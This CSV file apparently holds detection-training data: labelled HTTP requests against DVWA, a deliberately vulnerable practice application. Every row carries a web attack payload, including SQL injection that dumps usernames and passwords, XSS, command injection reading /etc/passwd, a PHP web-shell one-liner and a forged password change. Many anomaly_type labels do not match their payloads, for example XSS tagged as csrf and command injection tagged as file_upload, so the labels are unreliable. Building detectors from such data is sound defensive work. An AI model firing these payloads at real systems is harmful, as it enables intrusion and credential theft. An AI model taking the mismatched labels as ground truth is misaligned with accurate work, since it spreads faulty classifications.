request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
1,2025-12-01 0:00:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cbb312abc2133ffd54bfdc4beeedafb6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,sqli,anomalous
2,2025-12-01 0:10:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=13acdacbd2eecd622c3be621354caddc"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,csrf,anomalous
3,2025-12-01 0:20:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e5fdc1d25ec61bab24fae6165a331d2b"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
4,2025-12-01 0:30:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=65d1c55d22b4141ada654da56bfa44bf"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
5,2025-12-01 0:40:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=66433e3e5fcaa12a3aaad1df1351cfeb"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,file_upload,anomalous
6,2025-12-01 0:50:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f336bee5ccffdc6f51a65665bfceae6d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,file_upload,anomalous
7,2025-12-01 1:00:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bd6113a215b6ac23cb5c22f216c3ce3d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,command_injection,anomalous
8,2025-12-01 1:10:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=21b11beacdf1d641316b5d53bdce351d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,sqli,anomalous
9,2025-12-01 1:20:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4aeb6bf31b63bae1fae66ae33e15636c"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
10,2025-12-01 1:30:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c64e33cb3eafc6e45c2eda4e135da5d1"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
11,2025-12-01 1:40:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e4f6b5caf14363cf6622b513d31c2e3c"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,csrf,anomalous
12,2025-12-01 1:50:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dc42df314632d22b6cd4ba624f513eeb"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
13,2025-12-01 2:00:00,GET,http://dvwa.local/vulnerabilities/xss_r/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c61ac5f4362652314153fdc2412daddd"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
14,2025-12-01 2:10:00,GET,http://dvwa.local/vulnerabilities/xss_r/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c33ae1ecf52354eae456f312ccfae3eb"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
15,2025-12-01 2:20:00,GET,http://dvwa.local/vulnerabilities/xss_s/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=522bf5cddfe5d6f5f3a6ca6aac52cfb6"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
16,2025-12-01 2:30:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2634bd1615e6c24c3d3441a12a2afffe"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
17,2025-12-01 2:40:00,GET,http://dvwa.local/vulnerabilities/xss_s/?ip=127.0.0.1;whoami,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=36d41ff3d54b5cf2ea5cc4e53da6b3f4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
18,2025-12-01 2:50:00,GET,http://dvwa.local/vulnerabilities/fi/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bc3d1f1f3d3ddbcb14ccf361dbccca1d"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
19,2025-12-01 3:00:00,GET,http://dvwa.local/vulnerabilities/sql_i/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=24badfe6d5baf13b46bc1e224e5d2f1a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
20,2025-12-01 3:10:00,GET,http://dvwa.local/vulnerabilities/xss_d/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dac1be3fadd5acd424cbcbdba4246ffd"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
21,2025-12-01 3:20:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f2532ac352a4414c1fd6f46fedbbef2e"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,csrf,anomalous
22,2025-12-01 3:30:00,GET,http://dvwa.local/vulnerabilities/sqli/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=dd6e1621ece424c16f3b62cb11b65fb4"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
